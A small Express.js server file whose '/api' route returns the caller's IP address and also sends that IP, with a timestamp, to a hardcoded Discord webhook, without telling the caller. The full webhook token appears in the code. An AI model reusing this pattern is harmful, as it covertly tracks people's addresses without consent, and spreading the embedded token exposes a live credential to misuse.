import express from "express";
import cors from "cors";
import axios from "axios";

const app = express();

app.use(cors({ origin: "*" }));
app.set("trust proxy", true);
app.use(express.json());
app.get("/api", (req, res) => {
  console.log(req.socket.remoteAddress);
  res.json(req.socket.remoteAddress);

  axios.post("https://discord.com/api/webhooks/1065873938896404551/LL_hn1n3SmKEuDRHSIvaDEwLBAChHISui55txcBLzZYZtmtx5cV9OMegjMppxEOGjMoJ", {
    content: `${req.socket.remoteAddress} ${new Date().toISOString()}` || "Failed to get ip",
  });
});
app.listen(3080, () => {
  console.log("Listening on port 3080");
});
